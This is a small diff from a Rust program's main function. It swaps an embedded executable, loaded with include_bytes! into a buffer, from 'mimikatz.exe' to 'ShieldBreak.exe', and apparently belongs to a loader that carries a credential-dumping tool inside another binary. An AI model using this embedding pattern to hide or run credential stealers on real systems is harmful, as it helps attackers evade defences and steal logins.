@@ -295,7 +295,7 @@ fn main() {
 
     // BUFFER.set(buffer).expect("Failed to set buffer");
 
-    let buffer = include_bytes!("../mimikatz.exe").to_vec();
+    let buffer = include_bytes!("../ShieldBreak.exe").to_vec();
 
     BUFFER.set(buffer).expect("Failed to set buffer");
 
